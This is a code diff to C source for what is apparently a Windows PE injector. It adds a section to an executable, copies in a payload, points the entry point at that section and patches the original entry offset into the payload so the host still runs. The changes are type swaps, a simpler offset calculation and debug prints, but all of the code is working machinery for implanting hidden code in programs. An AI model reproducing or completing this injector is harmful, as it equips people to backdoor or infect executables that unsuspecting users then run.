@@ -119,12 +119,12 @@ void patch_payload(
   BYTE *payload,
   size_t payload_size,
   size_t offset_delta,
-  int64_t oldEntryPointOffset
+  LONGLONG oldEntryPointOffset
 ) {
     memcpy(payload_copy, payload, payload_size);
     printf("[DEBUG] Patching payload at offset %zu with old entry point offset 0x%llX\n", offset_delta, (unsigned long long)oldEntryPointOffset);
     // Patch the delta in the payload
-    *(int64_t *)(payload_copy + offset_delta) = oldEntryPointOffset;
+    *(LONGLONG *)(payload_copy + offset_delta) = oldEntryPointOffset;
     printf("[DEBUG] Patch delta at offset %zu with value 0x%llX\n", offset_delta, (unsigned long long)oldEntryPointOffset);
 }
 
@@ -142,6 +142,8 @@ void update_pe_headers(
   DWORD payload_size,
   DWORD section_align
 ) {
+    printf("[DEBUG] Updating PE headers...\n");
+    printf("[DEBUG] Old Entry Point: 0x%08X\n", nt->OptionalHeader.AddressOfEntryPoint);
     nt->FileHeader.NumberOfSections += 1;
     nt->OptionalHeader.SizeOfImage = newSection->VirtualAddress + ALIGN_UP(payload_size, section_align);
     nt->OptionalHeader.AddressOfEntryPoint = newSection->VirtualAddress;
@@ -326,9 +328,11 @@ int inject(const char *filename) {
         CloseHandle(hFile);
         return 1;
     }
-    int64_t oldEntryPointOffset = (int64_t)(nt->OptionalHeader.ImageBase + nt->OptionalHeader.AddressOfEntryPoint) -
-                                  (int64_t)(nt->OptionalHeader.ImageBase + newSection.VirtualAddress);
-    patch_payload(payload_copy, payload, payload_size, offset_delta, oldEntryPointOffset);
+
+    // Patch the payload with the old entry point offset
+    LONGLONG OEPoffset = (LONGLONG) nt->OptionalHeader.AddressOfEntryPoint - newSection.VirtualAddress;
+    printf("[DEBUG] Original OEP offset: 0x%llX\n", OEPoffset);
+    patch_payload(payload_copy, payload, payload_size, offset_delta, OEPoffset);
 
     WORD oldNumberOfSections = nt->FileHeader.NumberOfSections;
     update_pe_headers(nt, &newSection, payload_size, section_align);
